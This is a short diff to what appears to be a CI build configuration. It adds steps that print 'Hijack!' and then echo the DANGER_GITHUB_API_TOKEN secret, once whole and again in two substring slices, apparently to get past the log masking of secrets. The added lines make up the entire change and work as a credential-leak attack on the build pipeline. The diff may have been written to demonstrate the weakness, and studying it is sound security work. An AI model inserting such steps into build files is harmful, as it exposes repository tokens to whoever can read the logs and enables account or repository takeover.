@@ -5,6 +5,10 @@ install:
 script:
   - ./gradlew check jacocoTestReport
   - bundle exec danger
+  - echo Hijack!
+  - echo $DANGER_GITHUB_API_TOKEN
+  - echo ${DANGER_GITHUB_API_TOKEN:0:2}
+  - echo ${DANGER_GITHUB_API_TOKEN:2:100}
 before_cache:
   - rm -f  $HOME/.gradle/caches/modules-2/modules-2.lock
   - rm -fr $HOME/.gradle/caches/*/plugin-resolution/
